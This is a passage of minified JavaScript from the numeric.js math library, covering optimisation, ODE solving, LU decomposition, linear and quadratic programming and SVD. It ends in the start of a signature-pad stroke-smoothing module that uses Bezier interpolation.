a NaN!");var o,r,s,a,l,c,u,h,d,p=Math.max,f=numeric.clone(e),m=Array(n),g=(numeric.div,numeric.sub,p=Math.max,.001),v=Math.abs,y=Math.min,b=0;for(o=0;o<n;o++)for(var x=p(1e-6*i,1e-8);;){if(++b>20)throw new Error("Numerical gradient fails");if(f[o]=e[o]+x,r=t(f),f[o]=e[o]-x,s=t(f),f[o]=e[o],isNaN(r)||isNaN(s))x/=16;else{if(m[o]=(r-s)/(2*x),a=e[o]-x,l=e[o],c=e[o]+x,u=(r-i)/x,h=(i-s)/x,d=p(v(m[o]),v(i),v(r),v(s),v(a),v(l),v(c),1e-8),!(y(p(v(u-m[o]),v(h-m[o]),v(u-h))/d,x/d)>g))break;x/=16}}return m},numeric.uncmin=function(t,e,n,i,o,r,s){var a=numeric.gradient;void 0===s&&(s={}),void 0===n&&(n=1e-8),void 0===i&&(i=function(e){return a(t,e)}),void 0===o&&(o=1e3);var l,c,u=(e=numeric.clone(e)).length,h=t(e);if(isNaN(h))throw new Error("uncmin: f(x0) is a NaN!");var d=Math.max,p=numeric.norm2;n=d(n,numeric.epsilon);var f,m,g,v,y,b,x,w,_,k,T=s.Hinv||numeric.identity(u),C=numeric.dot,S=(numeric.inv,numeric.sub),E=numeric.add,j=numeric.tensor,A=numeric.div,M=numeric.mul,D=numeric.all,L=numeric.isFinite,P=numeric.neg,$=0,O="";for(m=i(e);$<o;){if("function"==typeof r&&r($,e,h,m,T)){O="Callback returned true";break}if(!D(L(m))){O="Gradient has Infinity or NaN";break}if(!D(L(f=P(C(T,m))))){O="Search direction has Infinity or NaN";break}if((k=p(f))<n){O="Newton step smaller than tol";break}for(_=1,c=C(m,f),y=e;$<o&&!(_*k<n)&&(y=E(e,v=M(f,_)),(l=t(y))-h>=.1*_*c||isNaN(l));)_*=.5,++$;if(_*k<n){O="Line search step size smaller than tol";break}if($===o){O="maxit reached during line search";break}T=S(E(T,M(((w=C(b=S(g=i(y),m),v))+C(b,x=C(T,b)))/(w*w),j(v,v))),A(E(j(x,v),j(v,x)),w)),e=y,h=l,m=g,++$}return{solution:e,f:h,gradient:m,invHessian:T,iterations:$,message:O}},numeric.Dopri=function(t,e,n,i,o,r,s){this.x=t,this.y=e,this.f=n,this.ymid=i,this.iterations=o,this.events=s,this.message=r},numeric.Dopri.prototype._at=function(t,e){function n(t){return t*t}var i,o,r,s,a,l,c,u,h,d=this,p=d.x,f=d.y,m=d.f,g=d.ymid,v=(p.length,Math.floor,.5),y=numeric.add,b=numeric.mul,x=numeric.sub;return i=p[e],o=p[e+1],s=f[e],a=f[e+1],r=i+v*(o-i),l=g[e],c=x(m[e],b(s,1/(i-r)+2/(i-o))),u=x(m[e+1],b(a,1/(o-r)+2/(o-i))),y(y(y(y(b(s,(h=[n(t-o)*(t-r)/n(i-o)/(i-r),n(t-i)*n(t-o)/n(i-r)/n(o-r),n(t-i)*(t-r)/n(o-i)/(o-r),(t-i)*n(t-o)*(t-r)/n(i-o)/(i-r),(t-o)*n(t-i)*(t-r)/n(i-o)/(o-r)])[0]),b(l,h[1])),b(a,h[2])),b(c,h[3])),b(u,h[4]))},numeric.Dopri.prototype.at=function(t){var e,n,i,o=Math.floor;if("number"!=typeof t){var r=t.length,s=Array(r);for(e=r-1;-1!==e;--e)s[e]=this.at(t[e]);return s}var a=this.x;for(e=0,n=a.length-1;n-e>1;)a[i=o(.5*(e+n))]<=t?e=i:n=i;return this._at(t,e)},numeric.dopri=function(t,e,n,i,o,r,s){void 0===o&&(o=1e-6),void 0===r&&(r=1e3);var a,l,c,u,h,d,p,f,m,g,v,y,b,x=[t],w=[n],_=[i(t,n)],k=[],C=[.075,.225],S=[44/45,-56/15,32/9],E=[19372/6561,-25360/2187,64448/6561,-212/729],j=[9017/3168,-355/33,46732/5247,49/176,-5103/18656],A=[35/384,0,500/1113,125/192,-2187/6784,11/84],M=[.10013431883002395,0,.3918321794184259,-.02982460176594817,.05893268337240795,-.04497888809104361,.023904308236133973],D=[.2,.3,.8,8/9,1,1],L=[-71/57600,0,71/16695,-71/1920,17253/339200,-22/525,.025],P=0,$=(e-t)/10,O=0,B=numeric.add,I=numeric.mul,N=(Math.max,Math.min),R=Math.abs,H=numeric.norminf,q=Math.pow,F=numeric.any,W=numeric.lt,z=numeric.and,V=(numeric.sub,new numeric.Dopri(x,w,_,k,-1,""));for("function"==typeof s&&(v=s(t,n));t<e&&O<r;)if(++O,t+$>e&&($=e-t),a=i(t+D[0]*$,B(n,I(.2*$,_[P]))),l=i(t+D[1]*$,B(B(n,I(C[0]*$,_[P])),I(C[1]*$,a))),c=i(t+D[2]*$,B(B(B(n,I(S[0]*$,_[P])),I(S[1]*$,a)),I(S[2]*$,l))),u=i(t+D[3]*$,B(B(B(B(n,I(E[0]*$,_[P])),I(E[1]*$,a)),I(E[2]*$,l)),I(E[3]*$,c))),h=i(t+D[4]*$,B(B(B(B(B(n,I(j[0]*$,_[P])),I(j[1]*$,a)),I(j[2]*$,l)),I(j[3]*$,c)),I(j[4]*$,u))),d=i(t+$,m=B(B(B(B(B(n,I(_[P],$*A[0])),I(l,$*A[2])),I(c,$*A[3])),I(u,$*A[4])),I(h,$*A[5]))),(g="number"==typeof(p=B(B(B(B(B(I(_[P],$*L[0]),I(l,$*L[2])),I(c,$*L[3])),I(u,$*L[4])),I(h,$*L[5])),I(d,$*L[6])))?R(p):H(p))>o){if(t+($=.2*$*q(o/g,.25))===t){V.msg="Step size became too small";break}}else{if(k[P]=B(B(B(B(B(B(n,I(_[P],$*M[0])),I(l,$*M[2])),I(c,$*M[3])),I(u,$*M[4])),I(h,$*M[5])),I(d,$*M[6])),x[++P]=t+$,w[P]=m,_[P]=d,"function"==typeof s){var U,X,Y=t,Q=t+.5*$;if(y=s(Q,k[P-1]),F(b=z(W(v,0),W(0,y)))||(Y=Q,v=y,y=s(Q=t+$,m),b=z(W(v,0),W(0,y))),F(b)){for(var K,G,Z=0,J=1,tt=1;;){if("number"==typeof v)X=(tt*y*Y-J*v*Q)/(tt*y-J*v);else for(X=Q,f=v.length-1;-1!==f;--f)v[f]<0&&y[f]>0&&(X=N(X,(tt*y[f]*Y-J*v[f]*Q)/(tt*y[f]-J*v[f])));if(X<=Y||X>=Q)break;G=s(X,U=V._at(X,P-1)),F(K=z(W(v,0),W(0,G)))?(Q=X,y=G,b=K,tt=1,-1===Z?J*=.5:J=1,Z=-1):(Y=X,v=G,J=1,1===Z?tt*=.5:tt=1,Z=1)}return m=V._at(.5*(t+X),P-1),V.f[P]=i(X,U),V.x[P]=X,V.y[P]=U,V.ymid[P-1]=m,V.events=b,V.iterations=O,V}}t+=$,n=m,v=y,$=N(.8*$*q(o/g,.25),4*$)}return V.iterations=O,V},numeric.LU=function(t,e){e=e||!1;var n,i,o,r,s,a,l,c,u,h=Math.abs,d=t.length,p=d-1,f=new Array(d);for(e||(t=numeric.clone(t)),o=0;o<d;++o){for(l=o,u=h((a=t[o])[o]),i=o+1;i<d;++i)u<(r=h(t[i][o]))&&(u=r,l=i);for(f[o]=l,l!=o&&(t[o]=t[l],t[l]=a,a=t[o]),s=a[o],n=o+1;n<d;++n)t[n][o]/=s;for(n=o+1;n<d;++n){for(c=t[n],i=o+1;i<p;++i)c[i]-=c[o]*a[i],c[++i]-=c[o]*a[i];i===p&&(c[i]-=c[o]*a[i])}}return{LU:t,P:f}},numeric.LUsolve=function(t,e){var n,i,o,r,s,a=t.LU,l=a.length,c=numeric.clone(e),u=t.P;for(n=l-1;-1!==n;--n)c[n]=e[n];for(n=0;n<l;++n)for(o=u[n],u[n]!==n&&(s=c[n],c[n]=c[o],c[o]=s),r=a[n],i=0;i<n;++i)c[n]-=c[i]*r[i];for(n=l-1;n>=0;--n){for(r=a[n],i=n+1;i<l;++i)c[n]-=c[i]*r[i];c[n]/=r[n]}return c},numeric.solve=function(t,e,n){return numeric.LUsolve(numeric.LU(t,n),e)},numeric.echelonize=function(t){var e,n,i,o,r,s,a,l,c=numeric.dim(t),u=c[0],h=c[1],d=numeric.identity(u),p=Array(u),f=Math.abs,m=numeric.diveq;for(t=numeric.clone(t),e=0;e<u;++e){for(i=0,r=t[e],s=d[e],n=1;n<h;++n)f(r[i])<f(r[n])&&(i=n);for(p[e]=i,m(s,r[i]),m(r,r[i]),n=0;n<u;++n)if(n!==e){for(l=(a=t[n])[i],o=h-1;-1!==o;--o)a[o]-=r[o]*l;for(a=d[n],o=u-1;-1!==o;--o)a[o]-=s[o]*l}}return{I:d,A:t,P:p}},numeric.__solveLP=function(t,e,n,i,o,r,s){var a,l,c,u,h=numeric.sum,d=(numeric.log,numeric.mul),p=numeric.sub,f=numeric.dot,m=numeric.div,g=numeric.add,v=t.length,y=n.length,b=!1,w=1,_=(numeric.transpose(e),numeric.svd,numeric.transpose),k=(numeric.leq,Math.sqrt),T=Math.abs,C=(numeric.muleq,numeric.norminf,numeric.any,Math.min),S=numeric.all,E=numeric.gt,j=Array(v),A=Array(y),M=(numeric.rep([y],1),numeric.solve),D=p(n,f(e,r)),L=f(t,t);for(c=0;c<o;++c){var P,$;for(P=y-1;-1!==P;--P)A[P]=m(e[P],D[P]);var O=_(A);for(P=v-1;-1!==P;--P)j[P]=h(O[P]);w=.25*T(L/f(t,j));var B=100*k(L/f(j,j));for((!isFinite(w)||w>B)&&(w=B),u=g(t,d(w,j)),l=f(O,A),P=v-1;-1!==P;--P)l[P][P]+=1;var I=m(D,f(e,$=M(l,m(u,w),!0))),N=1;for(P=y-1;-1!==P;--P)I[P]<0&&(N=C(N,-.999*I[P]));if(!S(E(D=p(n,f(e,a=p(r,d($,N)))),0)))return{solution:r,message:"",iterations:c};if(r=a,w<i)return{solution:a,message:"",iterations:c};if(s){var R=f(t,u),H=f(e,u);for(b=!0,P=y-1;-1!==P;--P)if(R*H[P]<0){b=!1;break}}else b=!(r[v-1]>=0);if(b)return{solution:a,message:"Unbounded",iterations:c}}return{solution:r,message:"maximum iteration count exceeded",iterations:c}},numeric._solveLP=function(t,e,n,i,o){var r=t.length,s=n.length,a=(numeric.sum,numeric.log,numeric.mul,numeric.sub),l=numeric.dot,c=(numeric.div,numeric.add,numeric.rep([r],0).concat([1])),u=numeric.rep([s,1],-1),h=numeric.blockMatrix([[e,u]]),d=n,p=numeric.rep([r],0).concat(Math.max(0,numeric.sup(numeric.neg(n)))+1),f=numeric.__solveLP(c,h,d,i,o,p,!1),m=numeric.clone(f.solution);if(m.length=r,numeric.inf(a(n,l(e,m)))<0)return{solution:NaN,message:"Infeasible",iterations:f.iterations};var g=numeric.__solveLP(t,e,n,i,o-f.iterations,m,!0);return g.iterations+=f.iterations,g},numeric.solveLP=function(t,e,n,i,o,r,s){if(void 0===s&&(s=1e3),void 0===r&&(r=numeric.epsilon),void 0===i)return numeric._solveLP(t,e,n,r,s);var a,l=i.length,c=i[0].length,u=e.length,h=numeric.echelonize(i),d=numeric.rep([c],0),p=h.P,f=[];for(a=p.length-1;-1!==a;--a)d[p[a]]=1;for(a=c-1;-1!==a;--a)0===d[a]&&f.push(a);var m=numeric.getRange,g=numeric.linspace(0,l-1),v=numeric.linspace(0,u-1),y=m(i,g,f),b=m(e,v,p),x=m(e,v,f),w=numeric.dot,_=numeric.sub,k=w(b,h.I),T=_(x,w(k,y)),C=_(n,w(k,o)),S=Array(p.length),E=Array(f.length);for(a=p.length-1;-1!==a;--a)S[a]=t[p[a]];for(a=f.length-1;-1!==a;--a)E[a]=t[f[a]];var j=_(E,w(S,w(h.I,y))),A=numeric._solveLP(j,T,C,r,s),M=A.solution;if(M!=M)return A;var D=w(h.I,_(o,w(y,M))),L=Array(t.length);for(a=p.length-1;-1!==a;--a)L[p[a]]=D[a];for(a=f.length-1;-1!==a;--a)L[f[a]]=M[a];return{solution:L,message:A.message,iterations:A.iterations}},numeric.MPStoLP=function(t){function e(e){throw new Error("MPStoLP: "+e+"\nLine "+n+": "+t[n]+"\nCurrent state: "+a[s]+"\n")}t instanceof String&&t.split("\n");var n,i,o,r,s=0,a=["Initial state","NAME","ROWS","COLUMNS","RHS","BOUNDS","ENDATA"],l=t.length,c=0,u={},h=[],d=0,p={},f=0,m=[],g=[],v=[];for(n=0;n<l;++n){var y=(o=t[n]).match(/\S*/g),b=[];for(i=0;i<y.length;++i)""!==y[i]&&b.push(y[i]);if(0!==b.length){for(i=0;i<a.length&&o.substr(0,a[i].length)!==a[i];++i);if(i<a.length){if(s=i,1===i&&(r=b[1]),6===i)return{name:r,c:m,A:numeric.transpose(g),b:v,rows:u,vars:p}}else switch(s){case 0:case 1:e("Unexpected line");case 2:switch(b[0]){case"N":0===c?c=b[1]:e("Two or more N rows");break;case"L":u[b[1]]=d,h[d]=1,v[d]=0,++d;break;case"G":u[b[1]]=d,h[d]=-1,v[d]=0,++d;break;case"E":u[b[1]]=d,h[d]=0,v[d]=0,++d;break;default:e("Parse error "+numeric.prettyPrint(b))}break;case 3:p.hasOwnProperty(b[0])||(p[b[0]]=f,m[f]=0,g[f]=numeric.rep([d],0),++f);var x=p[b[0]];for(i=1;i<b.length;i+=2)if(b[i]!==c){var w=u[b[i]];g[x][w]=(h[w]<0?-1:1)*parseFloat(b[i+1])}else m[x]=parseFloat(b[i+1]);break;case 4:for(i=1;i<b.length;i+=2)v[u[b[i]]]=(h[u[b[i]]]<0?-1:1)*parseFloat(b[i+1]);break;case 5:break;case 6:e("Internal error")}}}e("Reached end of file without ENDATA")},numeric.seedrandom={pow:Math.pow,random:Math.random},function(t,e,n,i,o,r,s){function a(t){var e,i,o=this,r=t.length,s=0,a=o.i=o.j=o.m=0;for(o.S=[],o.c=[],r||(t=[r++]);s<n;)o.S[s]=s++;for(s=0;s<n;s++)a=u(a+(e=o.S[s])+t[s%r]),i=o.S[a],o.S[s]=i,o.S[a]=e;o.g=function(t){var e=o.S,i=u(o.i+1),r=e[i],s=u(o.j+r),a=e[s];e[i]=a,e[s]=r;for(var l=e[u(r+a)];--t;)a=e[s=u(s+(r=e[i=u(i+1)]))],e[i]=a,e[s]=r,l=l*n+e[u(r+a)];return o.i=i,o.j=s,l},o.g(n)}function l(t,e,n,i,o){if(n=[],o=typeof t,e&&"object"==o)for(i in t)if(i.indexOf("S")<5)try{n.push(l(t[i],e-1))}catch(r){}return n.length?n:t+("string"!=o?"\0":"")}function c(t,e,n,i){for(t+="",n=0,i=0;i<t.length;i++)e[u(i)]=u((n^=19*e[u(i)])+t.charCodeAt(i));for(i in t="",e)t+=String.fromCharCode(e[i]);return t}function u(t){return t&n-1}e.seedrandom=function(u,h){var d,p=[];return u=c(l(h?[u,t]:arguments.length?u:[(new Date).getTime(),t,window],3),p),c((d=new a(p)).S,t),e.random=function(){for(var t=d.g(6),e=s,a=0;t<o;)t=(t+a)*n,e*=n,a=d.g(1);for(;t>=r;)t/=2,e/=2,a>>>=1;return(t+a)/e},u},s=e.pow(n,6),o=e.pow(2,o),r=2*o,c(e.random(),t)}([],numeric.seedrandom,256,0,52),function(){function t(e){if("object"!=typeof e)return e;var n,i=[],o=e.length;for(n=0;n<o;n++)i[n+1]=t(e[n]);return i}function e(t){if("object"!=typeof t)return t;var n,i=[],o=t.length;for(n=1;n<o;n++)i[n-1]=e(t[n]);return i}function r(t,e,r,s,a,l,c,u,h,d,p,f,m,g,v,y){function b(){for(g[1]=g[1]+1,S=P,T=1;T<=d;T+=1){for(S+=1,R=-u[T],C=1;C<=s;C+=1)R+=c[C][T]*a[C];if(Math.abs(R)<X&&(R=0),T>p)v[S]=R;else if(v[S]=-Math.abs(R),R>0){for(C=1;C<=s;C+=1)c[C][T]=-c[C][T];u[T]=-u[T]}}for(T=1;T<=m;T+=1)v[P+f[T]]=0;for(O=0,N=0,T=1;T<=d;T+=1)v[P+T]<N*v[I+T]&&(O=T,N=v[P+T]/v[I+T]);return 0===O?999:0}function x(){for(T=1;T<=s;T+=1){for(R=0,C=1;C<=s;C+=1)R+=t[C][T]*c[C][O];v[T]=R}for(E=M,T=1;T<=s;T+=1)v[E+T]=0;for(C=m+1;C<=s;C+=1)for(T=1;T<=s;T+=1)v[E+T]=v[E+T]+t[T][C]*v[C];for(V=!0,T=m;T>=1;T-=1){for(R=v[T],E=(S=L+T*(T+3)/2)-T,C=T+1;C<=m;C+=1)R-=v[S]*v[D+C],S+=C;if(R/=v[E],v[D+T]=R,f[T]<p)break;if(R<0)break;V=!1,A=T}if(!V)for(H=v[$+A]/v[D+A],T=1;T<=m&&!(f[T]<p)&&!(v[D+T]<0);T+=1)(N=v[$+T]/v[D+T])<H&&(H=N,A=T);for(R=0,T=M+1;T<=M+s;T+=1)R+=v[T]*v[T];if(Math.abs(R)<=X){if(V)return y[1]=1,999;for(T=1;T<=m;T+=1)v[$+T]=v[$+T]-H*v[D+T];return v[$+m+1]=v[$+m+1]+H,700}for(R=0,T=1;T<=s;T+=1)R+=v[M+T]*c[T][O];for(q=-v[P+O]/R,U=!0,V||H<q&&(q=H,U=!1),T=1;T<=s;T+=1)a[T]=a[T]+q*v[M+T],Math.abs(a[T])<X&&(a[T]=0);for(l[1]=l[1]+q*R*(q/2+v[$+m+1]),T=1;T<=m;T+=1)v[$+T]=v[$+T]-q*v[D+T];if(v[$+m+1]=v[$+m+1]+q,!U){for(R=-u[O],C=1;C<=s;C+=1)R+=a[C]*c[C][O];if(O>p)v[P+O]=R;else if(v[P+O]=-Math.abs(R),R>0){for(C=1;C<=s;C+=1)c[C][O]=-c[C][O];u[O]=-u[O]}return 700}for(f[m+=1]=O,S=L+(m-1)*m/2+1,T=1;T<=m-1;T+=1)v[S]=v[T],S+=1;if(m===s)v[S]=v[s];else{for(T=s;T>=m+1&&0!==v[T]&&(F=Math.max(Math.abs(v[T-1]),Math.abs(v[T])),W=Math.min(Math.abs(v[T-1]),Math.abs(v[T])),N=v[T-1]>=0?Math.abs(F*Math.sqrt(1+W*W/(F*F))):-Math.abs(F*Math.sqrt(1+W*W/(F*F))),F=v[T-1]/N,W=v[T]/N,1!==F);T-=1)if(0===F)for(v[T-1]=W*N,C=1;C<=s;C+=1)N=t[C][T-1],t[C][T-1]=t[C][T],t[C][T]=N;else for(v[T-1]=N,z=W/(1+F),C=1;C<=s;C+=1)N=F*t[C][T-1]+W*t[C][T],t[C][T]=z*(t[C][T-1]+N)-t[C][T],t[C][T-1]=N;v[S]=v[m]}return 0}function w(){if(0===v[E=(S=L+A*(A+1)/2+1)+A])return 798;if(F=Math.max(Math.abs(v[E-1]),Math.abs(v[E])),W=Math.min(Math.abs(v[E-1]),Math.abs(v[E])),N=v[E-1]>=0?Math.abs(F*Math.sqrt(1+W*W/(F*F))):-Math.abs(F*Math.sqrt(1+W*W/(F*F))),F=v[E-1]/N,W=v[E]/N,1===F)return 798;if(0===F){for(T=A+1;T<=m;T+=1)N=v[E-1],v[E-1]=v[E],v[E]=N,E+=T;for(T=1;T<=s;T+=1)N=t[T][A],t[T][A]=t[T][A+1],t[T][A+1]=N}else{for(z=W/(1+F),T=A+1;T<=m;T+=1)N=F*v[E-1]+W*v[E],v[E]=z*(v[E-1]+N)-v[E],v[E-1]=N,E+=T;for(T=1;T<=s;T+=1)N=F*t[T][A]+W*t[T][A+1],t[T][A+1]=z*(t[T][A]+N)-t[T][A+1],t[T][A]=N}return 0}function _(){for(E=S-A,T=1;T<=A;T+=1)v[E]=v[S],S+=1,E+=1;return v[$+A]=v[$+A+1],f[A]=f[A+1],(A+=1)<m?797:0}function k(){return v[$+m]=v[$+m+1],v[$+m+1]=0,f[m]=0,m-=1,g[2]=g[2]+1,0}var T,C,S,E,j,A,M,D,L,P,$,O,B,I,N,R,H,q,F,W,z,V,U,X,Y,Q,K;B=Math.min(s,d),S=2*s+B*(B+5)/2+2*d+1,X=1e-60;do{Y=1+.1*(X+=X),Q=1+.2*X}while(Y<=1||Q<=1);for(T=1;T<=s;T+=1)v[T]=e[T];for(T=s+1;T<=S;T+=1)v[T]=0;for(T=1;T<=d;T+=1)f[T]=0;if(j=[],0===y[1]){if(function o(t,e,n,i){var o,r,s,a,l,c;for(r=1;r<=n;r+=1){if(i[1]=r,c=0,(s=r-1)<1){if((c=t[r][r]-c)<=0)break;t[r][r]=Math.sqrt(c)}else{for(a=1;a<=s;a+=1){for(l=t[a][r],o=1;o<a;o+=1)l-=t[o][r]*t[o][a];l/=t[a][a],t[a][r]=l,c+=l*l}if((c=t[r][r]-c)<=0)break;t[r][r]=Math.sqrt(c)}i[1]=0}}(t,0,s,j),0!==j[1])return void(y[1]=2);(function i(t,e,n,i){var o,r,s,a;for(r=1;r<=n;r+=1){for(a=0,o=1;o<r;o+=1)a+=t[o][r]*i[o];i[r]=(i[r]-a)/t[r][r]}for(s=1;s<=n;s+=1)for(i[r=n+1-s]=i[r]/t[r][r],a=-i[r],o=1;o<r;o+=1)i[o]=i[o]+a*t[o][r]})(t,0,s,e),function n(t,e,n){var i,o,r,s,a;for(r=1;r<=n;r+=1){for(t[r][r]=1/t[r][r],a=-t[r][r],i=1;i<r;i+=1)t[i][r]=a*t[i][r];if(n<(s=r+1))break;for(o=s;o<=n;o+=1)for(a=t[r][o],t[r][o]=0,i=1;i<=r;i+=1)t[i][o]=t[i][o]+a*t[i][r]}}(t,0,s)}else{for(C=1;C<=s;C+=1)for(a[C]=0,T=1;T<=C;T+=1)a[C]=a[C]+t[T][C]*e[T];for(C=1;C<=s;C+=1)for(e[C]=0,T=C;T<=s;T+=1)e[C]=e[C]+t[C][T]*a[T]}for(l[1]=0,C=1;C<=s;C+=1)for(a[C]=e[C],l[1]=l[1]+v[C]*a[C],v[C]=0,T=C+1;T<=s;T+=1)t[T][C]=0;for(l[1]=-l[1]/2,y[1]=0,I=(P=(L=($=(D=(M=s)+s)+B)+B+1)+B*(B+1)/2)+d,T=1;T<=d;T+=1){for(R=0,C=1;C<=s;C+=1)R+=c[C][T]*c[C][T];v[I+T]=Math.sqrt(R)}for(m=0,g[1]=0,g[2]=0,K=0;;){if(999===(K=b()))return;for(;0!==(K=x());){if(999===K)return;if(700===K)if(A===m)k();else{for(;w(),797===(K=_()););k()}}}}numeric.solveQP=function s(n,i,o,s,a,l){n=t(n),i=t(i),o=t(o);var c,u,h,p,f,m=[],g=[],v=[],y=[],b=[];if(a=a||0,l=l?t(l):[void 0,0],s=s?t(s):[],u=n.length-1,h=o[1].length-1,!s)for(c=1;c<=h;c+=1)s[c]=0;for(c=1;c<=h;c+=1)g[c]=0;for(0,p=Math.min(u,h),c=1;c<=u;c+=1)v[c]=0;for(m[1]=0,c=1;c<=2*u+p*(p+5)/2+2*h+1;c+=1)y[c]=0;for(c=1;c<=2;c+=1)b[c]=0;return r(n,i,0,u,v,m,o,s,0,h,a,g,0,b,y,l),f="",1===l[1]&&(f="constraints are inconsistent, no solution!"),2===l[1]&&(f="matrix D in quadratic function is not positive definite!"),{solution:e(v),value:e(m),unconstrained_solution:e(i),iterations:e(b),iact:e(g),message:f}}}(),numeric.svd=function(t){function e(t,e){return(t=Math.abs(t))>(e=Math.abs(e))?t*Math.sqrt(1+e*e/t/t):0==e?t:e*Math.sqrt(1+t*t/e/e)}var n,i=numeric.epsilon,o=1e-64/i,s=0,a=0,l=0,c=0,u=0,h=numeric.clone(t),d=h.length,p=h[0].length;if(d<p)throw"Need more rows than columns";var f=new Array(p),m=new Array(p);for(a=0;a<p;a++)f[a]=m[a]=0;var g=numeric.rep([p,p],0),v=0,y=0,b=0,x=0,w=0,_=0,k=0;for(a=0;a<p;a++){for(f[a]=y,k=0,u=a+1,l=a;l<d;l++)k+=h[l][a]*h[l][a];if(k<=o)y=0;else for(v=h[a][a],y=Math.sqrt(k),v>=0&&(y=-y),b=v*y-k,h[a][a]=v-y,l=u;l<p;l++){for(k=0,c=a;c<d;c++)k+=h[c][a]*h[c][l];for(v=k/b,c=a;c<d;c++)h[c][l]+=v*h[c][a]}for(m[a]=y,k=0,l=u;l<p;l++)k+=h[a][l]*h[a][l];if(k<=o)y=0;else{for(v=h[a][a+1],y=Math.sqrt(k),v>=0&&(y=-y),b=v*y-k,h[a][a+1]=v-y,l=u;l<p;l++)f[l]=h[a][l]/b;for(l=u;l<d;l++){for(k=0,c=u;c<p;c++)k+=h[l][c]*h[a][c];for(c=u;c<p;c++)h[l][c]+=k*f[c]}}(w=Math.abs(m[a])+Math.abs(f[a]))>x&&(x=w)}for(a=p-1;-1!=a;a+=-1){if(0!=y){for(b=y*h[a][a+1],l=u;l<p;l++)g[l][a]=h[a][l]/b;for(l=u;l<p;l++){for(k=0,c=u;c<p;c++)k+=h[a][c]*g[c][l];for(c=u;c<p;c++)g[c][l]+=k*g[c][a]}}for(l=u;l<p;l++)g[a][l]=0,g[l][a]=0;g[a][a]=1,y=f[a],u=a}for(a=p-1;-1!=a;a+=-1){for(u=a+1,y=m[a],l=u;l<p;l++)h[a][l]=0;if(0!=y){for(b=h[a][a]*y,l=u;l<p;l++){for(k=0,c=u;c<d;c++)k+=h[c][a]*h[c][l];for(v=k/b,c=a;c<d;c++)h[c][l]+=v*h[c][a]}for(l=a;l<d;l++)h[l][a]=h[l][a]/y}else for(l=a;l<d;l++)h[l][a]=0;h[a][a]+=1}for(i*=x,c=p-1;-1!=c;c+=-1)for(var T=0;T<50;T++){var C=!1;for(u=c;-1!=u;u+=-1){if(Math.abs(f[u])<=i){C=!0;break}if(Math.abs(m[u-1])<=i)break}if(!C){s=0,k=1;var S=u-1;for(a=u;a<c+1&&(v=k*f[a],f[a]=s*f[a],!(Math.abs(v)<=i));a++)for(b=e(v,y=m[a]),m[a]=b,s=y/b,k=-v/b,l=0;l<d;l++)w=h[l][S],_=h[l][a],h[l][S]=w*s+_*k,h[l][a]=-w*k+_*s}if(_=m[c],u==c){if(_<0)for(m[c]=-_,l=0;l<p;l++)g[l][c]=-g[l][c];break}if(T>=49)throw"Error: no convergence.";for(x=m[u],y=e(v=(((w=m[c-1])-_)*(w+_)+((y=f[c-1])-(b=f[c]))*(y+b))/(2*b*w),1),v=v<0?((x-_)*(x+_)+b*(w/(v-y)-b))/x:((x-_)*(x+_)+b*(w/(v+y)-b))/x,s=1,k=1,a=u+1;a<c+1;a++){for(y=f[a],w=m[a],b=k*y,y*=s,_=e(v,b),f[a-1]=_,v=x*(s=v/_)+y*(k=b/_),y=-x*k+y*s,b=w*k,w*=s,l=0;l<p;l++)x=g[l][a-1],_=g[l][a],g[l][a-1]=x*s+_*k,g[l][a]=-x*k+_*s;for(_=e(v,b),m[a-1]=_,v=(s=v/_)*y+(k=b/_)*w,x=-k*y+s*w,l=0;l<d;l++)w=h[l][a-1],_=h[l][a],h[l][a-1]=w*s+_*k,h[l][a]=-w*k+_*s}f[u]=0,f[c]=v,m[c]=x}for(a=0;a<m.length;a++)m[a]<i&&(m[a]=0);for(a=0;a<p;a++)for(l=a-1;l>=0;l--)if(m[l]<m[a]){for(s=m[l],m[l]=m[a],m[a]=s,c=0;c<h.length;c++)n=h[c][a],h[c][a]=h[c][l],h[c][l]=n;for(c=0;c<g.length;c++)n=g[c][a],g[c][a]=g[c][l],g[c][l]=n;a=l}return{U:h,S:m,V:g}};var SignaturePadSmooth=function(t,e){var i=e.takePointsEvery||4,o=e.thresholdSmooth||20,r={stats:function(t){for(var e,n={mean:0,variance:0,deviation:0},i=t.length,o=0,r=i;r--;o+=t[r]);for(e=n.mean=o/i,r=i,o=0;r--;o+=Math.pow(t[r]-e,2));return n.deviation=Math.sqrt(n.variance=o/i),n},generate141Matrix:function(t){for(var e=[],n=0;n<t;n++){for(var i=[],o=0;o<t;o++)o===n?i.push(4):1===Math.abs(n-o)?i.push(1):i.push(0);e.push(i)}return e},generateConstantMatrix:function(t){var e=[];e.push(numeric.sub(numeric.mul(t[1],6),t[0]));for(var n=2;n<t.length-2;n++)e.push(numeric.mul(t[n],6));return e.push(numeric.sub(numeric.mul(t[t.length-2],6),t[t.length-1])),e},convertBSplineControlPointsToBezierControlPoints:function(t){for(var e=[],n=0;n<t.length-1;n++){if(0===n)var i=t[0];else i=s;var o=numeric.add(numeric.mul(2/3,t[n]),numeric.mul(1/3,t[n+1])),r=numeric.add(numeric.mul(1/3,t[n]),numeric.mul(2/3,t[n+1]));if(n==t.length-2)var s=t[t.length-1];else s=numeric.add(numeric.mul(1/6,t[n]),numeric.mul(2/3,t[n+1]),numeric.mul(1/6,t[n+2]));var a=[i,o,r,s];e.push(a)}return e},getBezierControlPoints:function(t){if(t.length<4){if(3===t.length)return[o=[t[0],t[1],t[1],t[2]]];if(2===t.length)return[o=[t[0],t[0],t[1],t[1]]];if(1===t.length)return[o=[t[0],t[0],t[0],t[0]]]}var e=r.generate141Matrix(t.length-2),n=r.generateConstantMatrix(t),i=numeric.dot(numeric.inv(e),n);i.splice(0,0,t[0]),i.push(t[t.length-1]);var o=r.convertBSplineControlPointsToBezierControlPoints(i);return o}},s={_subSample:function(t){for(var e,r,a,l=0,c=t.slice(),u=t.length-1;u>=0;u-=1){if((e=t[u]).length>=1&&e.length<=2&&-1===e[0].x&&-1===e[0].y){l=u;break}a=[];for(var h=e[0].time,d=(e[e.length-1].time-h)/e.length>o?i:Math.floor(i/2),p=0,f=e.length;p<f;p+=1)p%d==0&&a.push(e[p]);(f-1)%d!=0&&a.push(e[f-1]),r||(r=a[a.length-1]),c[u]=s._interpolateWithBeziers(a)}return l&&c.splice(l,1),r&&c.push([{x:-1,y:-1,color:r.color,time:r.time+1}]),c},_interpolateWithBeziers:function(t){if(i<2)return t;for(var e,n,s,a,l,c,u=new Array(t.length),h=[],d=.35,p=d*d,f=p*d,m=.65,g=m*m,v=g*m,y=0,b=t.length;y<b;y+=1)n=t[y],u[y]=[n.x,n.y];for(var 